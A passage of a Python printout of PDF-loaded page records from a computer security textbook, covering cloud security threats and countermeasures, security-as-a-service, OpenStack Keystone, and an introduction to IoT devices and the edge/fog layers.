\\nencryption may be an important self-help mechanism for subscribers, but businesses \\nshould ensure that other protections are in place to avoid inadvertent data loss.\\nAddressing Cloud Computing Security Concerns\\nNumerous documents have been developed to guide business thinking about the \\nsecurity issues associated with cloud computing. In addition to NIST SP 800-144, \\nM13_STAL0611_04_GE_C13.indd   456 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 458, 'page_label': '457'}, page_content='13.3 / CLOUD SECURITY APPROACHES  457\\nwhich provides overall guidance, there is also NIST SP 800-146 ( Cloud Computing \\nSynopsis and Recommendations, May 2012). NIST’s recommendations systematically \\nconsider each of the major types of cloud services consumed by businesses, including \\nSaaS, IaaS, and PaaS. While security issues vary somewhat depending on the type of \\ncloud service, there are multiple NIST recommendations that are independent of ser-\\nvice type. Not surprisingly, NIST recommends selecting cloud providers that support \\nstrong encryption, have appropriate redundancy mechanisms in place, employ authen-\\ntication mechanisms, and offer subscribers sufficient visibility about mechanisms used \\nto protect subscribers from other subscribers and the provider. NIST SP 800-146 also \\nlists the overall security controls that are relevant in a cloud computing environment \\nand that must be assigned to the different cloud actors. These are listed in Table 13.3.\\nAs more businesses incorporate cloud services into their enterprise network \\ninfrastructures, cloud computing security will persist as an important issue. Examples \\nof cloud computing security failures have the potential to have a chilling effect on \\nbusiness interest in cloud services. This is inspiring service providers to be serious \\nabout incorporating security mechanisms that will allay concerns of potential sub -\\nscribers. Some service providers have moved their operations to Tier 4 data centers \\n(see Section 5.8) to address user concerns about availability and redundancy. As so \\nmany businesses remain reluctant to embrace cloud computing in a big way, cloud \\nservice providers will have to continue to work hard to convince potential customers \\nthat computing support for core business processes and mission critical applications \\ncan be moved safely and securely to the cloud.\\n 13.3 CLOUD SECURITY APPROACHES\\nRisks and Countermeasures\\nIn general terms, security controls in cloud computing are similar to the security \\ncontrols in any IT environment. However, because of the operational models and \\ntechnologies used to enable cloud service, cloud computing may present risks that \\nare specific to the cloud environment. The essential concept in this regard is that \\nwhile the enterprise loses a substantial amount of control over resources, services, \\nand  applications, it must maintain accountability for security and privacy policies.\\nTechnical Operational Management\\nAccess Control\\nAudit and Accountability\\nIdentification and Authentication\\nSystem and Communication  \\n Protection\\nAwareness and Training\\nConfiguration and Management\\nContingency Planning\\nIncident Response\\nMaintenance\\nMedia Protection\\nPhysical and Environmental  \\n Protection\\nPersonnel Security System and  \\n Information Integrity\\nCertification, Accreditation and  \\n Security Assessment\\nPlanning Risk Assessment\\nSystem and Services Acquisition\\nTable 13.3 Control Functions and Classes\\nM13_STAL0611_04_GE_C13.indd   457 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 459, 'page_label': '458'}, page_content='458  CHAPTER 13 / CLOUD AND IoT SECURITY\\nThe Cloud Security Alliance [CSA13] lists the following as the top cloud-  \\nspecific security threats:\\n• Abuse and nefarious use of cloud computing:  For many CSPs, it is relatively \\neasy to register and begin using cloud services, some even offering free limited \\ntrial periods. This enables attackers to get inside the cloud to conduct various \\nattacks, such as spamming, malicious code attacks, and denial of service. PaaS \\nproviders have traditionally suffered most from this kind of attacks; however, \\nrecent evidence shows that hackers have begun to target IaaS vendors as well. \\nThe burden is on the CSP to protect against such attacks, but cloud service \\nclients must monitor activity with respect to their data and resources to detect \\nany malicious behavior.\\nCountermeasures include (1) stricter initial registration and validation \\n processes; (2) enhanced credit card fraud monitoring and coordination; (3) com-\\nprehensive inspection of customer network traffic; and (4) monitoring public \\nblacklists for one’s own network blocks.\\n• Insecure interfaces and APIs: CSPs expose a set of software interfaces or APIs \\nthat customers use to manage and interact with cloud services. The security and \\navailability of general cloud services is dependent upon the security of these \\nbasic APIs. From authentication and access control to encryption and activity \\nmonitoring, these interfaces must be designed to protect against both accidental \\nand malicious attempts to circumvent policy.\\nCountermeasures include (1) analyzing the security model of CSP inter-\\nfaces; (2) ensuring that strong authentication and access controls are imple -\\nmented in concert with encrypted transmission; and (3) understanding the \\ndependency chain associated with the API.\\n• Malicious insiders: Under the cloud computing paradigm, an organization relin-\\nquishes direct control over many aspects of security and, in doing so, confers \\nan unprecedented level of trust onto the CSP . One grave concern is the risk of \\nmalicious insider activity. Cloud architectures necessitate certain roles that are \\nextremely high risk. Examples include CSP system administrators and managed \\nsecurity service providers.\\nCountermeasures include the following: (1) enforce strict supply chain \\nmanagement and conduct a comprehensive supplier assessment; (2) specify \\nhuman resource requirements as part of legal contract; (3) require transpar -\\nency into overall information security and management practices, as well as \\ncompliance reporting; and (4) determine security breach notification processes.\\n• Shared technology issues: IaaS vendors deliver their services in a scalable way \\nby sharing infrastructure. Often, the underlying components that make up this \\ninfrastructure (CPU caches, GPUs, etc.) were not designed to offer strong isola-\\ntion properties for a multi-tenant architecture. CSPs typically approach this risk \\nby using isolated VMs for individual clients. This approach is still vulnerable to \\nattack, by both insiders and outsiders, and so can only be a part of an overall \\nsecurity strategy.\\nCountermeasures include the following: (1) implement security best prac-\\ntices for installation/configuration; (2) monitor environment for unauthorized \\nM13_STAL0611_04_GE_C13.indd   458 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 460, 'page_label': '459'}, page_content='13.3 / CLOUD SECURITY APPROACHES  459\\nchanges/activity; (3) promote strong authentication and access control for \\nadministrative access and operations; (4) enforce SLAs for patching and vul -\\nnerability remediation; and (5) conduct vulnerability scanning and configura -\\ntion audits.\\n• Data loss or leakage:  For many clients, the most devastating impact from a \\nsecurity breach is the loss or leakage of data. We will address this issue in the \\nnext section.\\nCountermeasures include the following: (1) implement strong API access \\n control; (2) encrypt and protect integrity of data in transit and at rest; (3) ana-\\nlyze data protection at both design and run time; and (4) implement strong key \\ngeneration, storage and management, and destruction practices.\\n• Account or service hijacking: Account and service hijacking, usually with stolen \\ncredentials, remains a top threat. With stolen credentials, attackers can often \\naccess critical areas of deployed cloud computing services, allowing them to \\ncompromise the confidentiality, integrity, and availability of those services.\\nCountermeasures include the following: (1) prohibit the sharing of account \\ncredentials between users and services; (2) leverage strong two-factor authen-\\ntication techniques where possible; (3) employ proactive monitoring to detect \\nunauthorized activity; and (4) understand CSP security policies and SLAs.\\n• Unknown risk profile: In using cloud infrastructures, the client necessarily cedes \\ncontrol to the cloud provider on a number of issues that may affect security. \\nThus the client must pay attention to and clearly define the roles and responsi-\\nbilities involved for managing risks. For example, employees may deploy appli-\\ncations and data resources at the CSP without observing the normal policies \\nand procedures for privacy, security, and oversight.\\nCountermeasures include (1) disclosure of applicable logs and data; (2) \\npartial/full disclosure of infrastructure details (e.g., patch levels and firewalls); \\nand (3) monitoring and alerting on necessary information.\\nSimilar lists have been developed by the European Network and Information \\nSecurity Agency [ENIS09] and NIST SP 800-144.\\nData Protection in the Cloud\\nThere are many ways to compromise data. Deletion or alteration of records without \\na backup of the original content is an obvious example. Unlinking a record from a \\nlarger context may render it unrecoverable, as can storage on unreliable media. Loss \\nof an encoding key may result in effective destruction. Finally, unauthorized parties \\nmust be prevented from gaining access to sensitive data.\\nThe threat of data compromise increases in the cloud, due to the number of, \\nand interactions between, risks and challenges that are either unique to the cloud \\nor more dangerous because of the architectural or operational characteristics of the \\ncloud environment.\\nDatabase environments used in cloud computing can vary significantly. Some \\nproviders support a multi-instance model, which provide a unique DBMS running on \\na VM instance for each cloud subscriber. This gives the subscriber complete control \\nover role definition, user authorization, and other administrative tasks related to \\nM13_STAL0611_04_GE_C13.indd   459 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 461, 'page_label': '460'}, page_content='460  CHAPTER 13 / CLOUD AND IoT SECURITY\\nsecurity. Other providers support a multi-tenant model, which provides a predefined \\nenvironment for the cloud subscriber that is shared with other tenants, typically \\nthrough tagging data with a subscriber identifier. Tagging gives the appearance of \\nexclusive use of the instance, but relies on the cloud provider to establish and main-\\ntain a sound secure database environment.\\nData must be secured while at rest, in transit, and in use, and access to the \\ndata must be controlled. The client can employ encryption to protect data in transit, \\nthough this involves key management responsibilities for the CSP . The client can \\nenforce access control techniques, but, again, the CSP is involved to some extent \\ndepending on the service model used.\\nFor data at rest, the ideal security measure is for the client to encrypt the \\ndatabase and only store encrypted data in the cloud, with the CSP having no access \\nto the encryption key. So long as the key remains secure, the CSP has no ability to \\ndecipher the data, although corruption and other denial-of-service attacks remain \\na risk. The model depicted in Figure 5.9 works equally well when the data is stored \\nin a cloud.\\nSecurity Approaches for Cloud Computing Assets\\nBeyond the protection and isolation of data, the cloud service provider (CSP) \\nneeds to address the broader security considerations for the protection of its assets. \\n Figure\\xa013.5a, adapted from [ENIS15], suggests a categorization of these assets for \\nthe three cloud service models. The bottom two layers shown in the figure include \\norganization and facilities. Organization denotes the human resources and the poli-\\ncies and procedures for maintaining the facilities and supporting the delivery of the \\nservices. Facilities denote the physical structures and supplies such as networks, cool-\\ning, and power supply. Above these levels are the assets specific to the provision of \\nservices. For IaaS, the CSP maintains a hypervisor and/or OS on each of its servers, as \\nwell as the networking software for interconnection of CSP servers and connection \\nto cloud service consumers (CSCs). Added to these assets for PaaS are the libraries, \\nmiddleware, and other software to support CSC applications. For SaaS, the CSP also \\nhas application software assets for CSC use.\\nFigure 13.5b suggests key security tasks that are the responsibility of the CSP \\nand of the CSC. The lowest level of the diagram has to do with organizational issues \\nrelated to the management of its supplies and facilities. These issues will be dealt with \\nin Chapters 14, 15, and 17 . The next level of Figure 13.5b covers the physical security \\nof the facility, a topic covered in Chapter 16. Above that, depending on the service \\nmodel, the CSP is responsible for the security of a range of software capabilities; \\nsecurity measures in the area were addressed in Chapters 11 and 12.\\nCloud Security as a Service\\nThe term security as a service  has generally meant a package of security services \\noffered by a service provider that offloads much of the security responsibility from \\nan enterprise to the security service provider. Among the services typically provided \\nare authentication, anti-virus, antimalware/spyware, intrusion detection, and security \\nevent management. In the context of cloud computing, cloud security as a service, \\ndesignated SecaaS, is a segment of the SaaS offering of a CSP .\\nM13_STAL0611_04_GE_C13.indd   460 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 462, 'page_label': '461'}, page_content='13.3 / CLOUD SECURITY APPROACHES  461\\nFigure 13.5 Security Considerations for Cloud Computing Assets\\n(a) Cloud computing assets\\nOrganization\\nProvider Customer\\nIaaS PaaS SaaS\\nHypervisor/\\nOS/Network\\nMiddleware +\\nHypervisor/OS/\\nNetwork\\nVirtual\\nmachine\\nApplication\\nApplication\\nClient Client\\nApplication +\\nMiddleware +\\nHypervisor/OS/\\nNetwork\\nOS\\nFacilities (network, housing, cooling, and power)\\n(b) Cloud computing management tasks\\nManage and protect supplies and facilities\\n(power, cooling, cabling, guards, etc.) \\nDeploy and maintain hardware\\n(server racks, disks, routers, cables, etc.) \\nProvider Customer\\nIaaS PaaS SaaS\\nManage user accounts, user permissions, etc.\\nDeploy, update, and\\npatch application software\\nDeploy,\\nupdate, and\\npatch OS \\nDeploy, update,\\nand patch app\\nsoftware\\nDeploy, update, and patch hypervisor/OS/network\\nDeploy, update, and patch\\nmiddleware + libraries\\nThe CSA defines SecaaS as the provision of security applications and services \\nvia the cloud either to cloud-based infrastructure and software, or from the cloud to \\nthe customers’ on-premise systems [CSA11]. The CSA has identified the following \\nSecaaS categories of service:\\n• Identity and access management\\n• Data loss prevention\\n• Web security\\nM13_STAL0611_04_GE_C13.indd   461 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 463, 'page_label': '462'}, page_content='462  CHAPTER 13 / CLOUD AND IoT SECURITY\\n• E-mail security\\n• Security assessments\\n• Intrusion management\\n• Security information and event management\\n• Encryption\\n• Business continuity and disaster recovery\\n• Network security\\nIn this section, we examine these categories with a focus on security of the  \\ncloud-based infrastructure and services (see Figure 13.6).\\nIdentity and access management (IAM) includes people, processes, and systems \\nthat are used to manage access to enterprise resources by assuring that the identity \\nof an entity is verified, then granting the correct level of access based on this assured \\nidentity. One aspect of identity management is identity provisioning, which has to do \\nwith providing access to identified users and subsequently deprovisioning, or denying \\nFigure 13.6 Elements of Cloud Security as a Service\\nCloud service clients and adversaries\\nIdentity and access management\\nNetwork security\\nData loss\\nprevention\\nWeb security\\nIntrusion\\nmanagement\\nEncryption\\nE-mail security\\nSecurity assessments\\nSecurity information and\\n event management\\nBusiness continuity and\\n disaster recovery\\nM13_STAL0611_04_GE_C13.indd   462 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 464, 'page_label': '463'}, page_content='13.3 / CLOUD SECURITY APPROACHES  463\\naccess, to users when the client enterprise designates such users as no longer having \\naccess to enterprise resources in the cloud. Among other requirements, the cloud \\nservice provider must be able to exchange identity attributes with the enterprise’s \\nchosen identity provider.\\nThe access management portion of IAM involves authentication and access \\ncontrol services. For example, the CSP must be able to authenticate users in a trust-\\nworthy manner. The access control requirements in SPI environments include estab-\\nlishing trusted user profile and policy information, using it to control access within \\nthe cloud service, and doing this in an auditable way.\\nData loss prevention (DLP)  is the monitoring, protecting, and verifying the \\nsecurity of data at rest, in motion, and in use. Much of DLP can be implemented by \\nthe cloud client, such as discussed in previously in this section (Data Protection in the \\nCloud). The CSP can also provide DLP services, such as implementing rules about \\nwhat functions can be performed on data in various contexts.\\nWeb security is real-time protection offered either on premise through soft -\\nware/appliance installation or via the cloud by proxying or redirecting Web traffic to \\nthe CSP . This provides an added layer of protection on top of things like antiviruses \\nto prevent malware from entering the enterprise via activities such as Web brows -\\ning. In addition to protecting against malware, a cloud-based Web security service \\nmight include usage policy enforcement, data backup, traffic control, and Web access \\ncontrol.\\nA CSP may provide a Web-based e-mail service, for which security measures \\nare needed. E-mail security provides control over inbound and outbound e-mail, pro-\\ntecting the organization from phishing, malicious attachments, enforcing corporate \\npolices such as acceptable use and spam prevention. The CSP may also incorporate \\ndigital signatures on all e-mail clients and provide optional e-mail encryption.\\nSecurity assessments are third-part audits of cloud services. While this service \\nis outside the province of the CSP , the CSP can provide tools and access points to \\nfacilitate various assessment activities.\\nIntrusion management  encompasses intrusion detection, prevention, and \\nresponse. The core of this service is the implementation of intrusion detection systems \\n(IDSs) and intrusion prevention systems (IPSs) at entry points to the cloud and on \\nservers in the cloud. An IDS is a set of automated tools designed to detect unauthor-\\nized access to a host system. An IPS incorporates IDS functionality and in addition \\nincludes mechanisms designed to block traffic from intruders.\\nSecurity information and event management (SIEM)  aggregates (via push or \\npull mechanisms) log and event data from virtual and real networks, applications, and \\nsystems. This information is then correlated and analyzed to provide real-time report-\\ning and alerting on information/events that may require intervention or other type \\nof response. The CSP typically provides an integrated service that can put together \\ninformation from a variety of sources both within the cloud and within the client \\nenterprise network.\\nEncryption is a pervasive service that can be provided for data at rest in the \\ncloud, e-mail traffic, client-specific network management information, and identity \\ninformation. Encryption services provided by the CSP involve a range of complex \\nissues, including key management, how to implement virtual private network (VPN) \\nservices in the cloud, application encryption, and data content access.\\nM13_STAL0611_04_GE_C13.indd   463 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 465, 'page_label': '464'}, page_content='464  CHAPTER 13 / CLOUD AND IoT SECURITY\\nBusiness continuity and disaster recovery comprise measures and mechanisms \\nto ensure operational resiliency in the event of any service interruptions. This is an \\narea where the CSP , because of economies of scale, can offer obvious benefits to a \\ncloud service client. The CSP can provide backup at multiple locations, with reliable \\nfailover and disaster recovery facilities. This service must include a flexible infrastruc-\\nture, redundancy of functions and hardware, monitored operations, geographically \\ndistributed data centers, and network survivability.\\nNetwork security  consists of security services that allocate access, distribute, \\nmonitor, and protect the underlying resource services. Services include perimeter and \\nserver firewalls and denial-of-service protection. Many of the other services listed in \\nthis section, including intrusion management, identity and access management, data \\nloss protection, and Web security, also contribute to the network security service.\\nAn Open-source Cloud Security Module\\nThis section provides an overview of an open-source security module that is part \\nof the OpenStack cloud OS. OpenStack is an open-source software project of the \\nOpenStack Foundation that aims to produce an open-source cloud operating sys -\\ntem [ROSA14, SEFR12]. The principal objective is to enable creating and managing \\nhuge groups of virtual private servers in a cloud computing environment. OpenStack \\nis embedded, to one degree or another, into data center infrastructure and cloud \\ncomputing products offered by Cisco, IBM, Hewlett-Packard, and other vendors. It \\nprovides multi-tenant IaaS, and aims to meets the needs of public and private clouds \\nregardless of size, by being simple to implement and massively scalable.\\nThe OpenStack OS consists of a number of independent modules, each of \\nwhich has a project name and a functional name. The modular structure is easy to \\nscale out and provides a commonly used set of core services. Typically, the compo -\\nnents are configured together to provide a comprehensive IaaS capability. However, \\nthe modular design is such that the components are generally capable of being used \\nindependently.\\nThe security module for OpenStack is Keystone. Keystone provides the shared \\nsecurity services essential for a functioning cloud computing infrastructure. It pro -\\nvides the following main services:\\n• Identity: This is user information authentication. This information defines a \\nuser’s role and permissions within a project, and is the basis for a role-based \\naccess control (RBAC) mechanism. Keystone supports multiple methods of \\nauthentication, including user name and password, Lightweight Directory \\nAccess Protocol (LDAP), and a means of configuring external authentication \\nmethods supplied by the CSC.\\n• Token: After authentication, a token is assigned and used for access control. \\nOpenStack services retain tokens and use them to query Keystone during \\noperations.\\n• Service catalog: OpenStack service endpoints are registered with Keystone to \\ncreate a service catalog. A client for a service connects to Keystone and deter-\\nmines an endpoint to call based on the returned catalog.\\nM13_STAL0611_04_GE_C13.indd   464 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 466, 'page_label': '465'}, page_content='13.3 / CLOUD SECURITY APPROACHES  465\\n• Policies: This service enforces different user access levels. Each OpenStack \\nservice defines the access policies for its resources in an associated policy file.  \\nA resource, for example, could be API access, the ability to attach to a volume, \\nor to fire up instances. These policies can be modified or updated by the cloud \\nadministrator to control the access to the various resources.\\nFigure 13.7 illustrates the way in which Keystone interacts with other Open -\\nStack components to launch a new VM. Nova is the management software module \\nthat controls VMs within the IaaS cloud computing platform. It manages the lifecycle \\nof compute instances in an OpenStack environment. Responsibilities include spawn-\\ning, scheduling, and decommissioning of machines on demand. Thus, Nova enables \\nenterprises and service providers to offer on-demand computing resources by pro -\\nvisioning and managing large networks of VMs. Glance is a lookup and retrieval \\nsystem for VM disk images. It provides services for discovering, registering, and \\nretrieving virtual images through an API. Swift is a distributed object store that \\ncreates a redundant and scalable storage space of up to multiple petabytes of data. \\nObject storage does not present a traditional file system, but rather a distributed \\nstorage system for static data such as VM images, photo storage, e-mail storage, \\nbackups, and archives.\\nFigure 13.7 Launching a Virtual Machine in OpenStack\\nNova\\nScheduler\\nNova\\nScheduler\\nSwift\\nproxy\\nSwift\\nworker\\n4. Schedule\\nVM\\n5. Receive\\n launch VM\\nmessage\\n6. Request\\nimage 8. Look up\\nimage\\n9. Return\\nlocation &\\nmetadata\\n10. Request image\\n13. Get image\\n11. Find service,\\ncheck credentials,\\nrequest image\\n7. Find service, check credentials,\\nrequest image\\n12. Get\\nimage\\n3. Launch\\nVM\\n14. Launch VM\\n1. Launch VM\\n2. Find service,\\ncheck credentials, launch VM\\nClient\\nNova\\ncompute\\nNova\\nmessage\\nqueue\\nKeystone\\nGlance\\nAPI\\nGlance\\nregistry\\nM13_STAL0611_04_GE_C13.indd   465 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 467, 'page_label': '466'}, page_content='466  CHAPTER 13 / CLOUD AND IoT SECURITY\\n 13.4 THE INTERNET OF THINGS\\nThe Internet of things is the latest development in the long and continuing revolu -\\ntion of computing and communications. Its size, ubiquity, and influence on everyday \\nlives, business, and government dwarf any technical advance that has gone before. \\nThis section provides a brief overview of the Internet of things.\\nThings on the Internet of Things\\nThe Internet of things (IoT) is a term that refers to the expanding interconnection \\nof smart devices, ranging from appliances to tiny sensors. A dominant theme is the \\nembedding of short-range mobile transceivers into a wide array of gadgets and every-\\nday items, enabling new forms of communication between people and things, and \\nbetween things themselves. The Internet now supports the interconnection of billions \\nof industrial and personal objects, usually through cloud systems. The objects deliver \\nsensor information, act on their environment, and in some cases modify themselves, \\nto create overall management of a larger system, like a factory or city.\\nThe IoT is primarily driven by deeply embedded devices. These devices are low-\\nbandwidth, low-repetition data capture, and low-bandwidth data-usage appliances \\nthat communicate with each other and provide data via user interfaces. Embedded \\nappliances, such as high-resolution video security cameras, video VoIP phones, and a \\nhandful of others, require high-bandwidth streaming capabilities. Yet countless prod-\\nucts simply require packets of data to be intermittently delivered.\\nEvolution\\nWith reference to the end systems supported, the Internet has gone through roughly \\nfour generations of deployment culminating in the IoT:\\n1. Information technology:  PCs, servers, routers, firewalls, and so on, bought as \\nIT\\xa0devices by enterprise IT people, primarily using wired connectivity.\\n2. Operational technology (OT): Machines/appliances with embedded IT built by \\nnon-IT companies, such as medical machinery, SCADA (supervisory control and \\ndata acquisition), process control, and kiosks, bought as appliances by enterprise \\nOT people and primarily using wired connectivity.\\n3. Personal technology:  Smartphones, tablets, and eBook readers bought as \\nIT\\xa0devices by consumers (employees), exclusively using wireless connectivity and \\noften multiple forms of wireless connectivity.\\n4. Sensor/actuator technology: Single-purpose devices bought by consumers, IT, \\nand OT people, exclusively using wireless connectivity, generally of a single \\nform, as part of larger systems.\\nThe fourth generation is usually thought of as the IoT, and which is marked by \\nusing billions of embedded devices.\\nComponents of IoT -enabled Things\\nThe key components of an IoT-enabled device are the following (see Figure 13.8):\\n• Sensor: A sensor measures some parameter of a physical, chemical, or bio -\\nlogical entity and delivers an electronic signal proportional to the observed \\nM13_STAL0611_04_GE_C13.indd   466 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 468, 'page_label': '467'}, page_content='13.4 / THE INTERNET OF THINGS  467\\ncharacteristic, either in the form of an analog voltage level or a digital signal. \\nIn both cases, the sensor output is typically input to a microcontroller or other \\nmanagement element.\\n• Actuator: An actuator receives an electronic signal from a controller and \\nresponds by interacting with its environment to produce an effect on some \\nparameter of a physical, chemical, or biological entity.\\n• Microcontroller: The “smart” in a smart device is provided by a deeply embed-\\nded microcontroller.\\n• Transceiver: A transceiver contains the electronics needed to transmit and \\nreceive data. Most IoT devices contain a wireless transceiver, capable of com-\\nmunication using Wi-Fi, ZigBee, or some other wireless scheme.\\n• Radio-frequency Identification (RFID): (RFID) technology, which uses radio \\nwaves to identify items, is increasingly becoming an enabling technology for IoT. \\nThe main elements of an RFID system are tags and readers. RFID tags are small \\nprogrammable devices used for object, animal, and human tracking. They come \\nin a variety of shapes, sizes, functionalities, and costs. RFID readers acquire and \\nsometimes rewrite information stored on RFID tags that come within operating \\nrange (a few inches up to several feet). Readers are usually connected to a com-\\nputer system that records and formats the acquired information for further uses.\\nIoT and Cloud Context\\nTo better understand the function of an IoT, it is useful to view it in the context of a \\ncomplete enterprise network that includes third-party networking and cloud comput-\\ning elements. Figure 13.9 provides an overview illustration.\\nedge At the edge of a typical enterprise network is a network of IoT-enabled  \\ndevices, consisting of sensors and perhaps actuators. These devices may communicate  \\nFigure 13.8 IoT Components\\nSensor\\nTransceiver RFID\\nActuator\\nMicrocontroller\\nIoT Device\\nM13_STAL0611_04_GE_C13.indd   467 10/11/17   3:08 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 469, 'page_label': '468'}, page_content='468  CHAPTER 13 / CLOUD AND IoT SECURITY\\nFigure 13.9 The IoT and Cloud Context\\nCloud network /\\nData centers\\nEthernet\\nTransactional\\nresponse time\\nCore network\\nIP/MPLS, security\\nQoS/QoE-driven\\nresponse time\\nFog network\\n3G/4G/LTE/Wi-Fi\\nDistributed intelligence\\nReal-time response time\\nEdge network of\\nIOT devices\\nBluetooth, WiFi, wired\\nmillisecond response time\\nNetwork management Applications\\nMillions\\nof devices\\nTens of\\nthousands\\nof devices\\nThousands\\nof devices\\nHundreds\\nof devices\\nwith one another. For example, a cluster of sensors may all transmit their data to one \\nsensor that aggregates the data to be collected by a higher-level entity. At this level, \\nthere may also be a number of gateways. A gateway interconnects the IoT-enabled \\ndevices with the higher-level communication networks. It performs the necessary \\ntranslation between the protocols used in the communication networks and those \\nused by devices. A gateway may also perform a basic data aggregation function.\\nfog In many IoT deployments,  massive amounts of data may be generated \\nby a distributed network of sensors. For example, offshore oil fields and refin -\\neries can generate a terabyte of data per day. An airplane can create multiple \\nterabytes of data per hour. Rather than store all of that data permanently (or \\nat least for a long period) in central storage accessible to IoT applications, it is \\noften desirable to do as much data processing close to the sensors as possible. \\nThus, the purpose of what is sometimes referred to as the edge computing level \\nis to convert network data flows into information that is suitable for storage \\nM13_STAL0611_04_GE_C13.indd   468 10/11/17   3:08 PM'),\n",
